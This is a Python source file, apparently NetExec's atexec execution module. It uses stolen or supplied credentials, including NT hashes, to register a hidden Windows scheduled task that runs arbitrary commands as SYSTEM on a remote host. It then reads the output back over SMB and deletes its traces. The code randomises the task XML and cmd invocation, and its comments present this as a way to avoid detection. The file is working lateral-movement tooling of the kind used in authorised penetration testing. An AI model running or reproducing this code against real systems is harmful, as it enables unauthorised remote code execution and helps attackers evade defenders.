import os
import random
from textwrap import dedent
from impacket.dcerpc.v5 import tsch, transport
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
from nxc.helpers.misc import gen_random_string
from time import sleep
from datetime import datetime, timedelta


class TSCH_EXEC:
    def __init__(self, target, share_name, username, password, domain, doKerberos=False, aesKey=None, remoteHost=None, kdcHost=None, hashes=None, logger=None, tries=None, share=None,
                 # These options are used by the schtask_as module, except the run_task_as
                 # that defaults to NT AUTHORITY\System user (SID S-1-5-18) if not specified
                 run_task_as="S-1-5-18", run_cmd=None, output_filename=None, task_name=None, output_file_location=None):
        self.__target = target
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__share_name = share_name
        self.__lmhash = ""
        self.__nthash = ""
        self.__outputBuffer = b""
        self.__retOutput = False
        self.__aesKey = aesKey
        self.__doKerberos = doKerberos
        self.__remoteHost = remoteHost
        self.__kdcHost = kdcHost
        self.__tries = tries
        self.__output_filename = None
        self.__share = share
        self.logger = logger

        # Optional args for finetuning the task execution, e.g. used in nxc/modules/schtask_as.py
        self.task_name = task_name if task_name else gen_random_string(8)
        self.run_task_as = run_task_as
        self.run_cmd = run_cmd
        self.output_filename = output_filename
        self.output_file_location = output_file_location

        if hashes is not None:
            # This checks to see if we didn't provide the LM Hash
            if hashes.find(":") != -1:
                self.__lmhash, self.__nthash = hashes.split(":")
            else:
                self.__nthash = hashes

        if self.__password is None:
            self.__password = ""

        stringbinding = rf"ncacn_np:{self.__target}[\pipe\atsvc]"
        self.__rpctransport = transport.DCERPCTransportFactory(stringbinding)
        self.__rpctransport.setRemoteHost(self.__remoteHost)

        if hasattr(self.__rpctransport, "set_credentials"):
            # This method exists only for selected protocol sequences.
            self.__rpctransport.set_credentials(
                self.__username,
                self.__password,
                self.__domain,
                self.__lmhash,
                self.__nthash,
                self.__aesKey,
            )
            self.__rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)

    def execute(self, command, output=False):
        self.__retOutput = output
        self.execute_handler(command)
        return self.__outputBuffer

    def output_callback(self, data):
        self.__outputBuffer = data

    def get_end_boundary(self):
        # Get current date and time + 1 day
        end_boundary = datetime.now() + timedelta(days=1)

        # Format it to match the format in the XML: "YYYY-MM-DDTHH:MM:SS.ssssss"
        return end_boundary.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3]

    def gen_xml(self, command):
        # Random setting order to help with detection
        settings = [
            "       <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>",
            "       <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>",
            "       <AllowHardTerminate>true</AllowHardTerminate>",
            "       <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>",
            "       <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>"
        ]
        random.shuffle(settings)
        randomized_settings = "\n".join(settings)
        settings2 = [
            "       <AllowStartOnDemand>true</AllowStartOnDemand>",
            "       <Hidden>true</Hidden>",
            "       <Enabled>true</Enabled>",
            "       <RunOnlyIfIdle>false</RunOnlyIfIdle>",
            "       <WakeToRun>false</WakeToRun>",
            "       <Priority>7</Priority>",
            "       <ExecutionTimeLimit>P3D</ExecutionTimeLimit>"
        ]
        random.shuffle(settings2)
        randomized_settings2 = "\n".join(settings2)
        idleSettings = [
            "         <StopOnIdleEnd>true</StopOnIdleEnd>",
            "         <RestartOnIdle>false</RestartOnIdle>"
        ]
        random.shuffle(idleSettings)
        randomized_idleSettings = "\n".join(idleSettings)

        random_cmd_path = [
            "cmd",
            "cmd.exe",
            "C:\\Windows\\System32\\cmd",
            "C:\\Windows\\System32\\cmd.exe",
            "C:\\Windows\\System32\\..\\System32\\cmd",
            "C:\\Windows\\System32\\..\\System32\\cmd.exe",
            "C:\\Windows\\..\\Windows\\System32\\cmd",
            "C:\\Windows\\..\\Windows\\System32\\cmd.exe",
        ]
        cmd_path = random.choice(random_cmd_path)
        random_cmd_arg = ["/c", "/C", "/Q /c", "/F:ON /c", "/T:fg /c", "/T:fg /Q /C", "/F:ON /Q /C"]
        full_command = f"{random.choice(random_cmd_arg)} {command}"

        xml = f"""<?xml version="1.0" encoding="UTF-16"?>
        <Task version="1.3" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
        <Triggers>
           <RegistrationTrigger>
           <EndBoundary>{self.get_end_boundary()}</EndBoundary>
           </RegistrationTrigger>
        </Triggers>
        <Principals>
           <Principal id="LocalSystem">
           <UserId>{self.run_task_as}</UserId>
           <RunLevel>HighestAvailable</RunLevel>
           </Principal>
        </Principals>
        <Settings>
           {randomized_settings}
           <IdleSettings>
           {randomized_idleSettings}
           </IdleSettings>
           {randomized_settings2}
        </Settings>
        <Actions Context="LocalSystem">
           <Exec>
           <Command>{cmd_path}</Command>
        """

        if self.__retOutput:
            file_location = "\\Windows\\Temp\\" if self.output_file_location is None else self.output_file_location
            if self.output_filename is None:
                self.__output_filename = os.path.join(file_location, gen_random_string(8))
            else:
                self.__output_filename = os.path.join(file_location, self.output_filename)
            argument_xml = f"      <Arguments>{full_command} &gt; {self.__output_filename} 2&gt;&amp;1</Arguments>"

        elif self.__retOutput is False:
            argument_xml = f"      <Arguments>{full_command}</Arguments>"

        self.logger.debug("Generated argument XML: " + argument_xml)
        xml += argument_xml

        xml += """
            </Exec>
        </Actions>
        </Task>
        """

        # Removing identation for the final XML file
        return dedent(xml)

    def execute_handler(self, command):
        dce = self.__rpctransport.get_dce_rpc()
        if self.__doKerberos:
            dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)

        dce.set_credentials(*self.__rpctransport.get_credentials())
        dce.connect()

        xml = self.gen_xml(command)
        self.logger.debug(f"Task XML: {xml}")
        self.logger.info(f"Creating task \\{self.task_name}")
        try:
            # Windows server 2003 has no MSRPC_UUID_TSCHS, if it bind, it will return abstract_syntax_not_supported
            dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
            dce.bind(tsch.MSRPC_UUID_TSCHS)
            tsch.hSchRpcRegisterTask(dce, f"\\{self.task_name}", xml, tsch.TASK_CREATE, NULL, tsch.TASK_LOGON_NONE)
        except Exception as e:
            if e.error_code and hex(e.error_code) == "0x80070005":
                self.logger.fail("Task scheduling was blocked.")
            elif e.error_code and hex(e.error_code) == "0x80070534":
                self.logger.fail(f"User {self.run_task_as} does not have a valid winstation, cannot run the task on its behalf.")
            else:
                self.logger.fail(str(e))
            return

        try:
            done = False
            while not done:
                self.logger.debug(f"Calling SchRpcGetLastRunInfo for \\{self.task_name}")
                resp = tsch.hSchRpcGetLastRunInfo(dce, f"\\{self.task_name}")
                if resp["pLastRuntime"]["wYear"] != 0:
                    done = True
                else:
                    sleep(2)
        except tsch.DCERPCSessionError as e:
            self.logger.fail(f"Error retrieving task last run info: {e}")

        self.logger.info(f"Deleting task \\{self.task_name}")
        tsch.hSchRpcDelete(dce, f"\\{self.task_name}")

        if self.__retOutput:
            smbConnection = self.__rpctransport.get_smb_connection()
            tries = 1
            # Give the command a bit of time to execute before we try to read the output, 0.4 seconds was good in testing
            sleep(0.4)
            while True:
                try:
                    self.logger.info(f"Attempting to read {self.__share}\\{self.__output_filename}")
                    smbConnection.getFile(self.__share, self.__output_filename, self.output_callback)
                    break
                except Exception as e:
                    if tries >= self.__tries:
                        self.logger.fail("ATEXEC: Could not retrieve output file, it may have been detected by AV. Please increase the number of tries with the option '--get-output-tries'. If it is still failing, try the 'wmi' protocol or another exec method")
                        break
                    if "STATUS_BAD_NETWORK_NAME" in str(e):
                        self.logger.fail(f"ATEXEC: Getting the output file failed - target has blocked access to the share: {self.__share} (but the command may have executed!)")
                        break
                    elif "STATUS_VIRUS_INFECTED" in str(e):
                        self.logger.fail("Command did not run because a virus was detected")
                        break
                    # When executing PowerShell and the command is still running, we get a sharing violation
                    # We can use that information to wait longer than if the file is not found (probably av or something)
                    if "STATUS_SHARING_VIOLATION" in str(e):
                        self.logger.info(f"File {self.__share}\\{self.__output_filename} is still in use with {self.__tries - tries} tries left, retrying...")
                        tries += 1
                        sleep(1)
                    elif "STATUS_OBJECT_NAME_NOT_FOUND" in str(e):
                        self.logger.info(f"File {self.__share}\\{self.__output_filename} not found with {self.__tries - tries} tries left, deducting 10 tries and retrying...")
                        tries += 10
                        sleep(1)
                    else:
                        self.logger.debug(f"Exception when trying to read output file: {e!s}. {self.__tries - tries} tries left, retrying...")
                        tries += 1
                        sleep(1)
            try:
                self.logger.debug(f"Deleting file {self.__share}\\{self.__output_filename}")
                smbConnection.deleteFile(self.__share, self.__output_filename)
            except Exception:
                pass

        dce.disconnect()
